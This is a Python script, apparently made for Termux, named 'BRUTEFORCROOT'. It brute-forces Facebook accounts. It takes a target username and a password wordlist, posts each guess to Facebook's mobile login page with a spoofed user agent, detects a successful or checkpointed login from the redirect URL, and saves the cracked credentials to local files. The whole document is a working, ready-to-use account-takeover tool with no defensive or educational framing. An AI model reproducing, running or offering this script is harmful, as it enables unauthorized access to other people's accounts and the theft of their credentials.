import os
import sys
import time
import requests
import re

logo = """ \033[1;91m                   
                   `/ymMMMMMMMMmy/`
               `/ymMMMMMMMMMMMMMMmy/`
              /hMMMMMMMMMMMMMMMMMMMMMMh/
            /mMMmNMMMMMNNNNNNNNMMMMMNNMMm/
          `hNmo:dMMNNNmNNmNNmNNmNNNMMd:omNh`
         .mh:+/hMNNNNmNNmNdhmmNNmNNNNMy/o:hm.
        `d+://sNmMMMmMMMmdy+/mMMMmMMMmNs///+d`
        ys.o/oMmNNNmNNMNNMmdMNNMNNmNNNmMo/o.ys
       `my.-/NmMMMMmMMNmNNyyNNmNMMmMMMMmN/:`ym`
       -h/+s/MmMMMNmNNNdym++mymNNNmNMMNmM:so/h-
       -N.o.sMmMMMNh/:-`-MosM-`-:/hNMMMmMs.+.N-
\033[1;97m       `ho/-ohmMMMM/    -M/+M.    /MMMMmho-/oh
        s+-s-odmNNN`     /-:/     .NNNmd+:s-+s
        `mo/-:+ymMm                mMms+:-/om`
         .h/+/y`hhs                yyh`y/+/h.
          `hd/::-+.                .+-::/dy`
            /hs+/::.--          --.::/+sh:
              :hds+/-`          `-/+sdh:
                `/ymM+          oMmy:\033[1;97m
                  [\033[41;1m BRUTEFORCROOT \033[00;1m\033[1;97m]
"""
os.system('clear')
print (logo)

url = 'https://mobile.facebook.com/login.php'
headers = {
	  'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16','Accept-Langue' : 'en-US,en:q=0.5'
}
hack = open('hack.txt','a')
chek = open('chek.txt','a')
 
def pahrul():
	print (logo)
	id = input('\033[97m(+) username/email : ')
	wordlist = input('\033[97m(+) wordlist ( word.txt ) : ')
	password = open(wordlist,'r').readlines()
	print('\033[97m(+) Total Password : ',len(password))
	print ('\n\033[97m(+) Please Wait...')
	for line in password:
		pw = line.strip()
		data = {
			'email':id,
			'pass':pw
		}
		r = requests.post(url,headers=headers,data=data)
		if('home.php?' in r.url or 'free' in r.url):
			hack1 = '\n\033[1;97m(\033[1;97m\033[1;92m✓\033[1;97m) SUCCESSFUL \n\033[1;97m(+) Username : '+id+'\n\033[1;97m(+) Password : '+pw+'\n\n(+) Thank You For Using My Script '
			print(hack1)
			hack.write(hack1)
			os.sys.exit()
		elif('checkpoint' in r.url):
			chek1 = '\n\033[1;97m(\033[1;97m\033[1;91m!\033[1;97m) CHEKPOINT \n\033[1;97m(+) Username : '+id+'\n\033[1;97m(+) Password : '+pw
			print(chek1)
			chek.write(chek1)
			os.sys.exit()
		else:
			print('\n(\033[1;97m\033[1;91m!\033[1;97m) '+id+' | '+pw+'')
			

def masuk():
	x = input ('(+) Do you want to make a wordlist [Y/n] : ')
	if x == "n":
		os.system('clear')
		pahrul()
	elif x == "Y":
		os.system('clear')
		os.system('rm word.txt')
		os.system('pkg install nano')
		os.system('nano word.txt')
	else:
		exit()
		
			
if __name__=='__main__':
	masuk()

# Mau Ngapain Tod ?

